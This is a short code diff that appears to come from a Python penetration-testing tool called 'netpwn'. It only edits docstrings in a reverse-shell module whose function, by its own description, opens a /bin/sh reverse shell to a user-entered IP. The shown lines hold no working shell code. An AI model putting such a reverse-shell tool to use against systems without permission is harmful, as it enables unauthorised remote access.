@@ -1,5 +1,5 @@
 #!/usr/bin/python
-"""Reverse shell module"""
+"""Reverse shell module."""
 
 import os
 import socket
@@ -9,7 +9,7 @@ from termcolor import colored
 
 
 def reverse_shell():
-    """Creates a reverse shell using /bin/sh"""
+    """Create a reverse shell using /bin/sh."""
     try:
         print colored('Enter the IP to connect to', 'green')
         tgt_host = raw_input(colored('(netpwn: reverse_shell) > ', 'red'))
